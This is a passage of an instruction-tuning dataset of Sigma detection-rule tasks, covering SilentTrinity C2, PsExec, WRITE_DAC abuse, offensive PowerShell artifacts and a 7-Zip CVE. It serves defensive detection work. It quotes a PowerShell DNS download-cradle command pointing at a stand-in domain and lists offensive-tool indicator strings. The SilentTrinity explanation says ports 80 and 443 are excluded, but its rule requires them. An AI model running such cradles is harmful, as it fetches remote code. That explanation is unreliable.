    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: network_connection\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\msbuild.exe'\n    filter:\n        DestinationPort:\n            - 80\n            - 443\n        Initiated: 'true'\n    condition: selection and filter\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: network_connection\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\msbuild.exe'\n    filter:\n        DestinationPort:\n            - 80\n            - 443\n        Initiated: 'true'\n    condition: selection and filter\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "possible remote connections to Silenttrinity c2",
      "answer": "In order to detect a possible remote connections to Silenttrinity c2, you should: Focus on analyzing network connection logs specifically from Windows-based systems. Look for events where an application, identified by ending with the path '\\msbuild.exe', initiates a network connection. This particular application is significant as it is commonly leveraged in such remote connection attempts. However, not all network activities flagged via this application are of concern; therefore, refine your detection by excluding network connections that are made to the standard web ports 80 and 443. These exclusions are crucial as communications over these ports could be benign and are commonly used for legitimate web traffic, thus reducing the possibility of false positives. Despite potential unknown false positives, the identification of such network activities should be treated with a high level of scrutiny due to the associated risk of Silenttrinity c2 connections."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting This rule tries to detect powershell download cradles, e.g. powershell . (nslookup -q=txt http://some.owned.domain.com)[-1].\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect powershell download cradles, e.g. powershell . (nslookup -q=txt http://some.owned.domain.com)[-1], you should: focus on monitoring process creation events on Windows systems. Specifically, look for instances where the parent process is PowerShell (`powershell.exe`) and the child process involves `nslookup`. Additionally, check if the command line includes '=txt ', which is indicative of a DNS text record query often used in this context. This approach helps in identifying suspicious activities that attempt to leverage DNS queries through PowerShell for executing or downloading malicious payloads, serving as an effective method in pinpointing potential security breaches related to malicious domain interactions.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\powershell.exe'\n        Image|contains: nslookup\n        CommandLine|contains: '=txt '\n    condition: selection\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\powershell.exe'\n        Image|contains: nslookup\n        CommandLine|contains: '=txt '\n    condition: selection\nlevel: medium\n",
      "question": "This rule tries to detect powershell download cradles, e.g. powershell . (nslookup -q=txt http://some.owned.domain.com)[-1]",
      "answer": "In order to detect powershell download cradles, e.g. powershell . (nslookup -q=txt http://some.owned.domain.com)[-1], you should: focus on monitoring process creation events on Windows systems. Specifically, look for instances where the parent process is PowerShell (`powershell.exe`) and the child process involves `nslookup`. Additionally, check if the command line includes '=txt ', which is indicative of a DNS text record query often used in this context. This approach helps in identifying suspicious activities that attempt to leverage DNS queries through PowerShell for executing or downloading malicious payloads, serving as an effective method in pinpointing potential security breaches related to malicious domain interactions."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting suspicious encoded payloads in WMI Event Consumers.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect suspicious encoded payloads in WMI Event Consumers, you should monitor Windows Management Instrumentation (WMI) event logs for specific encoded payload patterns. Focus on identifying any events where the destination contains certain base64 offsets indicative of suspicious or potentially malicious content. These include patterns that reference \"WriteProcessMemory\", which suggests an attempt to modify another process's memory\u2014a common tactic in exploitation and persistence; or strings like \"This program cannot be run in DOS mode\" and \"This program must be run under Win32\", which are typically found in the headers of Windows executables and may indicate embedded or obfuscated executable content within the payload. Monitoring for these specific patterns in WMI event logs is crucial. Additionally, keeping track of the user and the operation involved in these events can provide further context and aid in investigation. It is important to note that while this approach is high in its detection level, there may still be unknown false positives, so corroborating these findings with other indicators of compromise is recommended.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: wmi_event\ndetection:\n    selection_destination:\n        Destination|base64offset|contains:\n            - 'WriteProcessMemory'\n            - 'This program cannot be run in DOS mode'\n            - 'This program must be run under Win32'\n    condition: selection_destination\nfields:\n    - User\n    - Operation\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: wmi_event\ndetection:\n    selection_destination:\n        Destination|base64offset|contains:\n            - 'WriteProcessMemory'\n            - 'This program cannot be run in DOS mode'\n            - 'This program must be run under Win32'\n    condition: selection_destination\nfields:\n    - User\n    - Operation\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "suspicious encoded payloads in WMI Event Consumers",
      "answer": "In order to detect suspicious encoded payloads in WMI Event Consumers, you should monitor Windows Management Instrumentation (WMI) event logs for specific encoded payload patterns. Focus on identifying any events where the destination contains certain base64 offsets indicative of suspicious or potentially malicious content. These include patterns that reference \"WriteProcessMemory\", which suggests an attempt to modify another process's memory\u2014a common tactic in exploitation and persistence; or strings like \"This program cannot be run in DOS mode\" and \"This program must be run under Win32\", which are typically found in the headers of Windows executables and may indicate embedded or obfuscated executable content within the payload. Monitoring for these specific patterns in WMI event logs is crucial. Additionally, keeping track of the user and the operation involved in these events can provide further context and aid in investigation. It is important to note that while this approach is high in its detection level, there may still be unknown false positives, so corroborating these findings with other indicators of compromise is recommended."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting changes to the registry keys related to \"Trusted Location\" of Microsoft Office. Attackers might add additional trusted locations to avoid macro security restrictions..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect changes to the registry keys related to \"Trusted Location\" of Microsoft Office, where attackers might add additional trusted locations to avoid macro security restrictions, you should: Focus on monitoring Windows registry activities, specifically looking for events where registry keys under the \"Security\\Trusted Locations\\Location\" path are modified. These modifications are identified by the EventType \"Setvalue\", which indicates a value within a registry key has been changed. Pay particular attention to registry keys that end with '\\Path', as these are directly related to the locations that Microsoft Office considers trusted. It's crucial to note that legitimate office installations or setups may also modify these keys, adding trusted locations and potentially triggering a detection. Therefore, these changes are categorized with a medium level of concern due to possible false positives during such installations or configurations. Continuously monitoring these registry changes can help in identifying unauthorized attempts to bypass macro security restrictions by tampering with trusted locations.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection:\n        EventType: Setvalue\n        TargetObject|contains: 'Security\\Trusted Locations\\Location'\n        TargetObject|endswith: '\\Path'\n    condition: selection\nfalsepositives:\n    - During office installations or setup, trusted locations are added, which will trigger this rule.\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection:\n        EventType: Setvalue\n        TargetObject|contains: 'Security\\Trusted Locations\\Location'\n        TargetObject|endswith: '\\Path'\n    condition: selection\nfalsepositives:\n    - During office installations or setup, trusted locations are added, which will trigger this rule.\nlevel: medium\n",
      "question": "changes to the registry keys related to \"Trusted Location\" of Microsoft Office. Attackers might add additional trusted locations to avoid macro security restrictions.",
      "answer": "In order to detect changes to the registry keys related to \"Trusted Location\" of Microsoft Office, where attackers might add additional trusted locations to avoid macro security restrictions, you should: Focus on monitoring Windows registry activities, specifically looking for events where registry keys under the \"Security\\Trusted Locations\\Location\" path are modified. These modifications are identified by the EventType \"Setvalue\", which indicates a value within a registry key has been changed. Pay particular attention to registry keys that end with '\\Path', as these are directly related to the locations that Microsoft Office considers trusted. It's crucial to note that legitimate office installations or setups may also modify these keys, adding trusted locations and potentially triggering a detection. Therefore, these changes are categorized with a medium level of concern due to possible false positives during such installations or configurations. Continuously monitoring these registry changes can help in identifying unauthorized attempts to bypass macro security restrictions by tampering with trusted locations."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting PsExec service installation and execution events (service and Sysmon).\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect PsExec service installation and execution events (service and Sysmon), you should monitor Windows System logs for specific events indicating that a new service has been installed or executed, particularly focusing on events from the Service Control Manager. Look for the event ID 7045, which signals a service installation, especially if the service name is 'PSEXESVC' and the image path ends with '\\PSEXESVC.exe'. This is a strong indicator of PsExec service installation. Additionally, keep an eye out for event ID 7036, which indicates service execution, specifically if the service name mentioned is 'PSEXESVC'. \n\nFor detailed investigation, focus on fields such as EventID, CommandLine, ParentCommandLine, ServiceName, ServiceFileName, TargetFilename, and PipeName, as they provide critical information on how the service was installed or executed. \n\nBe aware that there might be unknown scenarios that could lead to false positives, hence maintaining a low level of alert severity until further investigation can substantiate a malicious activity. \n\nThis monitoring strategy is aligned with identifying tactics and techniques such as Execution and Lateral Movement, which are often associated with malicious actors utilizing tools like PsExec to execute commands or deploy payloads remotely on a target system.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: system\ndetection:\n    service_installation:\n        Provider_Name: 'Service Control Manager'\n        EventID: 7045\n        ServiceName: 'PSEXESVC'\n        ImagePath|endswith: '\\PSEXESVC.exe'\n    service_execution:\n        EventID: 7036\n        ServiceName: 'PSEXESVC'\n    condition: 1 of service_*\nfields:\n    - EventID\n    - CommandLine\n    - ParentCommandLine\n    - ServiceName\n    - ServiceFileName\n    - TargetFilename\n    - PipeName\nfalsepositives:\n    - Unknown\nlevel: low\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: system\ndetection:\n    service_installation:\n        Provider_Name: 'Service Control Manager'\n        EventID: 7045\n        ServiceName: 'PSEXESVC'\n        ImagePath|endswith: '\\PSEXESVC.exe'\n    service_execution:\n        EventID: 7036\n        ServiceName: 'PSEXESVC'\n    condition: 1 of service_*\nfields:\n    - EventID\n    - CommandLine\n    - ParentCommandLine\n    - ServiceName\n    - ServiceFileName\n    - TargetFilename\n    - PipeName\nfalsepositives:\n    - Unknown\nlevel: low\n",
      "question": "PsExec service installation and execution events (service and Sysmon)",
      "answer": "In order to detect PsExec service installation and execution events (service and Sysmon), you should monitor Windows System logs for specific events indicating that a new service has been installed or executed, particularly focusing on events from the Service Control Manager. Look for the event ID 7045, which signals a service installation, especially if the service name is 'PSEXESVC' and the image path ends with '\\PSEXESVC.exe'. This is a strong indicator of PsExec service installation. Additionally, keep an eye out for event ID 7036, which indicates service execution, specifically if the service name mentioned is 'PSEXESVC'. \n\nFor detailed investigation, focus on fields such as EventID, CommandLine, ParentCommandLine, ServiceName, ServiceFileName, TargetFilename, and PipeName, as they provide critical information on how the service was installed or executed. \n\nBe aware that there might be unknown scenarios that could lead to false positives, hence maintaining a low level of alert severity until further investigation can substantiate a malicious activity. \n\nThis monitoring strategy is aligned with identifying tactics and techniques such as Execution and Lateral Movement, which are often associated with malicious actors utilizing tools like PsExec to execute commands or deploy payloads remotely on a target system."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting WRITE_DAC access to a domain object.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect WRITE_DAC access to a domain object, you should: monitor for specific events within Windows security logs that match certain criteria indicating potential unauthorized or malicious activity. Specifically, look for Event ID 4662 within these logs, which corresponds to an attempt to perform an operation on an Active Directory object. The operation in question is identified by the AccessMask value '0x40000', which specifically denotes WRITE_DAC access. This type of access allows changes to be made to the Discretionary Access Control List (DACL) of an object, thus potentially altering who has permissions to the object. The objects of interest are identified by their ObjectType values, either '19195a5b-6da0-11d0-afd3-00c04fd930c9' or labeled as 'domainDNS'. These indicate attempts to modify the access control lists of critical domain objects, a tactic that can be employed to escalate privileges or maintain persistence within a network. It is crucial to monitor these activities as they pertain to the 'DS' ObjectServer, which is the directory service, and are flagged as critical due to the potential for significant security implications. Such activities are often indicators of malicious actors attempting to gain elevated access or control within an organization's IT environment.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 4662\n        ObjectServer: 'DS'\n        AccessMask: '0x40000'\n        ObjectType:\n            - '19195a5b-6da0-11d0-afd3-00c04fd930c9'\n            - 'domainDNS'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: critical\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 4662\n        ObjectServer: 'DS'\n        AccessMask: '0x40000'\n        ObjectType:\n            - '19195a5b-6da0-11d0-afd3-00c04fd930c9'\n            - 'domainDNS'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: critical\n",
      "question": "WRITE_DAC access to a domain object",
      "answer": "In order to detect WRITE_DAC access to a domain object, you should: monitor for specific events within Windows security logs that match certain criteria indicating potential unauthorized or malicious activity. Specifically, look for Event ID 4662 within these logs, which corresponds to an attempt to perform an operation on an Active Directory object. The operation in question is identified by the AccessMask value '0x40000', which specifically denotes WRITE_DAC access. This type of access allows changes to be made to the Discretionary Access Control List (DACL) of an object, thus potentially altering who has permissions to the object. The objects of interest are identified by their ObjectType values, either '19195a5b-6da0-11d0-afd3-00c04fd930c9' or labeled as 'domainDNS'. These indicate attempts to modify the access control lists of critical domain objects, a tactic that can be employed to escalate privileges or maintain persistence within a network. It is crucial to monitor these activities as they pertain to the 'DS' ObjectServer, which is the directory service, and are flagged as critical due to the potential for significant security implications. Such activities are often indicators of malicious actors attempting to gain elevated access or control within an organization's IT environment."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting creation of a process from Windows task manager.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the creation of a process from Windows task manager, you should: focus on the creation of processes within Windows environments. Specifically, monitor for instances where the Windows Task Manager ('taskmgr.exe') is the parent process initiating the creation of a new process. However, it's important to exclude any processes that are commonly associated with administrative tasks and are initiated by the Task Manager itself, such as 'resmon.exe' (Resource Monitor), 'mmc.exe' (Microsoft Management Console), or 'taskmgr.exe'. This involves keeping an eye on the logs that detail process creation, paying special attention to the parent process involved, while ensuring to differentiate between legitimate administrative activities and potential malicious usage. Generally, the fields of interest in these logs would include the names and command line parameters of both the newly created process and its parent process. This approach typically generates a low level of false positives, primarily related to standard administrative activities.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\taskmgr.exe'\n    filter:\n        Image|endswith:\n            - '\\resmon.exe'\n            - '\\mmc.exe'\n            - '\\taskmgr.exe'\n    condition: selection and not filter\nfields:\n    - Image\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Administrative activity\nlevel: low\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\taskmgr.exe'\n    filter:\n        Image|endswith:\n            - '\\resmon.exe'\n            - '\\mmc.exe'\n            - '\\taskmgr.exe'\n    condition: selection and not filter\nfields:\n    - Image\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Administrative activity\nlevel: low\n",
      "question": "creation of a process from Windows task manager",
      "answer": "In order to detect the creation of a process from Windows task manager, you should: focus on the creation of processes within Windows environments. Specifically, monitor for instances where the Windows Task Manager ('taskmgr.exe') is the parent process initiating the creation of a new process. However, it's important to exclude any processes that are commonly associated with administrative tasks and are initiated by the Task Manager itself, such as 'resmon.exe' (Resource Monitor), 'mmc.exe' (Microsoft Management Console), or 'taskmgr.exe'. This involves keeping an eye on the logs that detail process creation, paying special attention to the parent process involved, while ensuring to differentiate between legitimate administrative activities and potential malicious usage. Generally, the fields of interest in these logs would include the names and command line parameters of both the newly created process and its parent process. This approach typically generates a low level of false positives, primarily related to standard administrative activities."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting SyncAppvPublishingServer process execution which usually utilized by adversaries to bypass PowerShell execution restrictions..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect SyncAppvPublishingServer process execution which usually utilized by adversaries to bypass PowerShell execution restrictions, you should: Focus on monitoring PowerShell activity within Windows environments. Specifically, look for any instances where the process 'SyncAppvPublishingServer.exe' is executed. This process is commonly exploited by attackers to circumvent PowerShell execution restrictions. It is crucial to be aware of legitimate App-V client interactions, as they may also trigger this detection, leading to potential false positives. This detection strategy is rated with a medium level of confidence and has been marked as deprecated, indicating that while it may still be relevant, there may be more current or accurate methods of detection. The associated attacker tactics and techniques include leveraging system utilities to bypass security measures.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: powershell\ndetection:\n    selection:\n        - 'SyncAppvPublishingServer.exe'\n    condition: selection\nfalsepositives:\n    - App-V clients\nlevel: medium\nstatus: deprecated",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: powershell\ndetection:\n    selection:\n        - 'SyncAppvPublishingServer.exe'\n    condition: selection\nfalsepositives:\n    - App-V clients\nlevel: medium\nstatus: deprecated",
      "question": "SyncAppvPublishingServer process execution which usually utilized by adversaries to bypass PowerShell execution restrictions.",
      "answer": "In order to detect SyncAppvPublishingServer process execution which usually utilized by adversaries to bypass PowerShell execution restrictions, you should: Focus on monitoring PowerShell activity within Windows environments. Specifically, look for any instances where the process 'SyncAppvPublishingServer.exe' is executed. This process is commonly exploited by attackers to circumvent PowerShell execution restrictions. It is crucial to be aware of legitimate App-V client interactions, as they may also trigger this detection, leading to potential false positives. This detection strategy is rated with a medium level of confidence and has been marked as deprecated, indicating that while it may still be relevant, there may be more current or accurate methods of detection. The associated attacker tactics and techniques include leveraging system utilities to bypass security measures."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting execution of AppX packages with known suspicious or malicious signature.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect execution of AppX packages with known suspicious or malicious signature, you should monitor Windows application packaging logs for specific events related to the installation or execution of AppX packages. Focus your attention on events with the ID 157 within the AppX packaging service logs. This particular event ID indicates the activation of an AppX package, which could potentially be harmful if it originates from untrusted sources. Specifically, lookout for packages signed by the certificate with a subject name of \"CN=Foresee Consulting Inc., O=Foresee Consulting Inc., L=North York, S=Ontario, C=CA, SERIALNUMBER=1004913-1, OID.1.3.6.1.4.1.311.60.2.1.3=CA, OID.2.5.4.15=Private Organization\". This certificate has been identified as suspicious or malicious based on its usage in various attacks. It is crucial to be aware that there might be instances where this detection could trigger false positives, although the circumstances under which these might occur are unknown. The severity level for this detection has been set to medium, indicating a balanced caution between overlooking potential threats and overreacting to benign activities. This detection is aligned with techniques identified by MITRE ATT&CK relating to the abuse of application deployment systems for the purpose of executing untrusted code.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: appxpackaging-om\ndetection:\n    selection:\n        EventID: 157\n        # Add more known suspicious/malicious certificates used in different attacks\n        subjectName: 'CN=Foresee Consulting Inc., O=Foresee Consulting Inc., L=North York, S=Ontario, C=CA, SERIALNUMBER=1004913-1, OID.1.3.6.1.4.1.311.60.2.1.3=CA, OID.2.5.4.15=Private Organization'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: appxpackaging-om\ndetection:\n    selection:\n        EventID: 157\n        # Add more known suspicious/malicious certificates used in different attacks\n        subjectName: 'CN=Foresee Consulting Inc., O=Foresee Consulting Inc., L=North York, S=Ontario, C=CA, SERIALNUMBER=1004913-1, OID.1.3.6.1.4.1.311.60.2.1.3=CA, OID.2.5.4.15=Private Organization'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "execution of AppX packages with known suspicious or malicious signature",
      "answer": "In order to detect execution of AppX packages with known suspicious or malicious signature, you should monitor Windows application packaging logs for specific events related to the installation or execution of AppX packages. Focus your attention on events with the ID 157 within the AppX packaging service logs. This particular event ID indicates the activation of an AppX package, which could potentially be harmful if it originates from untrusted sources. Specifically, lookout for packages signed by the certificate with a subject name of \"CN=Foresee Consulting Inc., O=Foresee Consulting Inc., L=North York, S=Ontario, C=CA, SERIALNUMBER=1004913-1, OID.1.3.6.1.4.1.311.60.2.1.3=CA, OID.2.5.4.15=Private Organization\". This certificate has been identified as suspicious or malicious based on its usage in various attacks. It is crucial to be aware that there might be instances where this detection could trigger false positives, although the circumstances under which these might occur are unknown. The severity level for this detection has been set to medium, indicating a balanced caution between overlooking potential threats and overreacting to benign activities. This detection is aligned with techniques identified by MITRE ATT&CK relating to the abuse of application deployment systems for the purpose of executing untrusted code."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting when app permissions (app roles) for other APIs are granted.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect when app permissions (app roles) for other APIs are granted, you should: Monitor Azure audit logs for any actions that indicate an \"Add app role assignment to service principal\" event. This involves tracking specific messages within the properties of the audit logs to identify when permissions are being assigned to service principals, which could imply that app roles are being granted to applications for accessing other APIs. It's important to be aware that there could be legitimate cases where such permissions are needed for an app to function properly; these instances are considered as potential false positives. The severity of this type of activity is considered medium, highlighting the necessity for scrutiny without immediate assumption of malicious intent.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: azure\n    service: auditlogs\ndetection:\n    selection:\n        properties.message: Add app role assignment to service principal\n    condition: selection\nfalsepositives:\n    - When the permission is legitimately needed for the app\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: azure\n    service: auditlogs\ndetection:\n    selection:\n        properties.message: Add app role assignment to service principal\n    condition: selection\nfalsepositives:\n    - When the permission is legitimately needed for the app\nlevel: medium\n",
      "question": "when app permissions (app roles) for other APIs are granted",
      "answer": "In order to detect when app permissions (app roles) for other APIs are granted, you should: Monitor Azure audit logs for any actions that indicate an \"Add app role assignment to service principal\" event. This involves tracking specific messages within the properties of the audit logs to identify when permissions are being assigned to service principals, which could imply that app roles are being granted to applications for accessing other APIs. It's important to be aware that there could be legitimate cases where such permissions are needed for an app to function properly; these instances are considered as potential false positives. The severity of this type of activity is considered medium, highlighting the necessity for scrutiny without immediate assumption of malicious intent."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting focuses on trivial artifacts observed in variants of prevalent offensive ps1 payloads, including\nCobalt Strike Beacon, PoshC2, Powerview, Letmein, Empire, Powersploit, and other attack payloads \nthat often undergo minimal changes by attackers due to bad opsec.\n.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to focus on trivial artifacts observed in variants of prevalent offensive ps1 payloads, including Cobalt Strike Beacon, PoshC2, Powerview, Letmein, Empire, Powersploit, and other attack payloads that often undergo minimal changes by attackers due to bad opsec, you should: monitor Windows PowerShell module logs for specific strings of text that are common to these attack tools. These include '$DoIt', 'harmj0y', 'mattifestation', '_RastaMouse', 'tifkin_', and '0xdeadbeef'. These strings are artifacts that could indicate the use of known malicious PowerShell scripts involved in the execution of these payloads. The detection relies heavily on identifying these strings within the PowerShell module logs. It should be noted that while there may be moderate-to-low false positives, the specificity of these strings to offensive PowerShell operations makes this a critical alert. The analysis and monitoring for these specific strings help in identifying potentially malicious activity associated with well-known attack tools, indicative of bad operational security practices by attackers.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: ps_module\n    definition: 0ad03ef1-f21b-4a79-8ce8-e6900c54b65b\ndetection:\n    selection_4103:\n        Payload|contains:\n            - '$DoIt'\n            - 'harmj0y'\n            - 'mattifestation'\n            - '_RastaMouse'\n            - 'tifkin_'\n            - '0xdeadbeef'\n    condition: selection_4103\nfalsepositives:\n    - 'Moderate-to-low; Despite the shorter length/lower entropy for some of these, because of high specificity, fp appears to be fairly limited in many environments.'\nlevel: critical\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: ps_module\n    definition: 0ad03ef1-f21b-4a79-8ce8-e6900c54b65b\ndetection:\n    selection_4103:\n        Payload|contains:\n            - '$DoIt'\n            - 'harmj0y'\n            - 'mattifestation'\n            - '_RastaMouse'\n            - 'tifkin_'\n            - '0xdeadbeef'\n    condition: selection_4103\nfalsepositives:\n    - 'Moderate-to-low; Despite the shorter length/lower entropy for some of these, because of high specificity, fp appears to be fairly limited in many environments.'\nlevel: critical\n",
      "question": "focuses on trivial artifacts observed in variants of prevalent offensive ps1 payloads, including\nCobalt Strike Beacon, PoshC2, Powerview, Letmein, Empire, Powersploit, and other attack payloads \nthat often undergo minimal changes by attackers due to bad opsec.\n",
      "answer": "In order to focus on trivial artifacts observed in variants of prevalent offensive ps1 payloads, including Cobalt Strike Beacon, PoshC2, Powerview, Letmein, Empire, Powersploit, and other attack payloads that often undergo minimal changes by attackers due to bad opsec, you should: monitor Windows PowerShell module logs for specific strings of text that are common to these attack tools. These include '$DoIt', 'harmj0y', 'mattifestation', '_RastaMouse', 'tifkin_', and '0xdeadbeef'. These strings are artifacts that could indicate the use of known malicious PowerShell scripts involved in the execution of these payloads. The detection relies heavily on identifying these strings within the PowerShell module logs. It should be noted that while there may be moderate-to-low false positives, the specificity of these strings to offensive PowerShell operations makes this a critical alert. The analysis and monitoring for these specific strings help in identifying potentially malicious activity associated with well-known attack tools, indicative of bad operational security practices by attackers."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting potential exploitation attempts of CVE-2022-29072, a 7-Zip privilege escalation and command execution vulnerability.\n7-Zip version 21.07 and earlier on Windows allows privilege escalation (CVE-2022-29072) and command execution when a file with the .7z extension is dragged to the Help>Contents area. This is caused by misconfiguration of 7z.dll and a heap overflow.\nThe command runs in a child process under the 7zFM.exe process.\n.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect potential exploitation attempts of CVE-2022-29072, a 7-Zip privilege escalation and command execution vulnerability, you should: Monitor Windows process creation logs for instances where the command prompt (cmd.exe) is launched, paying attention to commands that originate from or are associated with the 7-Zip File Manager (7zFM.exe). Specifically, commands should not include typical command-line invocations such as '/c', '/k', or '/r', nor should they lack a command line entirely. This approach helps in identifying unusual or suspicious command executions that could indicate an attempt to exploit the mentioned vulnerability in 7-Zip, where malicious actors could escalate privileges and execute commands through specially crafted .7z files. The monitoring is highly relevant due to the potential high impact of such an exploitation, given 7-Zip's widespread use and the severity of this specific vulnerability allowing privilege escalation and arbitrary command execution.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\cmd.exe'\n        - OriginalFileName: 'Cmd.Exe'\n    selection_parent:\n        ParentImage|endswith: '\\7zFM.exe'\n    filter_bat:\n        CommandLine|contains:\n            - ' /c '\n            - ' /k '\n            - ' /r '\n    filter_null:\n        CommandLine: null\n    condition: all of selection_* and not 1 of filter_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\cmd.exe'\n        - OriginalFileName: 'Cmd.Exe'\n    selection_parent:\n        ParentImage|endswith: '\\7zFM.exe'\n    filter_bat:\n        CommandLine|contains:\n            - ' /c '\n            - ' /k '\n            - ' /r '\n    filter_null:\n        CommandLine: null\n    condition: all of selection_* and not 1 of filter_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "potential exploitation attempts of CVE-2022-29072, a 7-Zip privilege escalation and command execution vulnerability.\n7-Zip version 21.07 and earlier on Windows allows privilege escalation (CVE-2022-29072) and command execution when a file with the .7z extension is dragged to the Help>Contents area. This is caused by misconfiguration of 7z.dll and a heap overflow.\nThe command runs in a child process under the 7zFM.exe process.\n",
      "answer": "In order to detect potential exploitation attempts of CVE-2022-29072, a 7-Zip privilege escalation and command execution vulnerability, you should: Monitor Windows process creation logs for instances where the command prompt (cmd.exe) is launched, paying attention to commands that originate from or are associated with the 7-Zip File Manager (7zFM.exe). Specifically, commands should not include typical command-line invocations such as '/c', '/k', or '/r', nor should they lack a command line entirely. This approach helps in identifying unusual or suspicious command executions that could indicate an attempt to exploit the mentioned vulnerability in 7-Zip, where malicious actors could escalate privileges and execute commands through specially crafted .7z files. The monitoring is highly relevant due to the potential high impact of such an exploitation, given 7-Zip's widespread use and the severity of this specific vulnerability allowing privilege escalation and arbitrary command execution."
    }
  },
  {
